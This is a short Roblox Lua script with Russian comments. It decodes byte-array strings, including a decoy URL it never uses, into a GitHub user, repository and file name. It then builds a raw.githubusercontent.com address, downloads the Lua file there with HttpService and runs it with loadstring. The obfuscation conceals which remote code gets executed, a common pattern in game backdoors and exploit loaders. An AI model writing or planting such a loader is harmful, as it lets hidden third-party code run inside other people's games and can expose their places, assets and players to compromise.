-- Закодированные данные
local nonstandardURL = {104, 116, 116, 97, 115, 100, 97, 115, 112, 115, 58, 47, 47, 114, 97, 119, 46, 100, 102, 100, 115, 102, 100, 46, 99, 111, 109, 115, 100, 115, 102, 115, 100, 102, 100, 97, 47, 66, 115, 114, 100, 105, 52, 50, 51, 52, 97, 115, 107, 101, 115, 116, 115, 100, 50, 51, 52, 97, 115, 110, 47, 50, 102, 52, 100, 97, 115, 100, 97, 115, 100, 97, 53, 55, 104, 50, 52, 51, 50, 51, 52, 107, 100, 51, 50, 51, 97, 116, 111, 109, 47, 109, 115, 100, 102, 115, 100, 97, 51, 50, 52, 51, 52, 115, 116, 101, 114, 47, 83, 52, 53, 111, 102, 52, 53, 116, 46, 108, 117, 97, 97, 115, 100, 115, 97, 52, 50, 51, 52, 50, 51, 115}
local encodedUser = {66, 114, 105, 107, 101, 115, 116, 117, 110}
local encodedRepo = {50, 102, 52, 53, 55, 104, 107, 100, 51, 50, 51, 97, 116, 111, 109}
local encodedFilename = {83, 111, 102, 116}
local function decode(encoded)
local decoded = {}
for _, byte in ipairs(encoded) do
table.insert(decoded, string.char(byte))
end
return table.concat(decoded)
end
local nonstandardURLDecoded = decode(nonstandardURL)
local user = decode(encodedUser)
local repo = decode(encodedRepo)
local filename = decode(encodedFilename)
local function convertToGitHubURL(nonstandardURL)
local githubURL = "https://raw.githubusercontent.com/"
githubURL = githubURL .. user .. "/" .. repo .. "/main/" .. filename .. ".lua"
return githubURL
end
local githubURL = convertToGitHubURL(nonstandardURLDecoded)
local HttpService = game:GetService("HttpService")
local scriptSource = HttpService:GetAsync(githubURL)
local function executeScript(scriptSource)
local func = loadstring(scriptSource)
if func then
func()
else
print("Не удалось загрузить скрипт.")
end
end
executeScript(scriptSource)
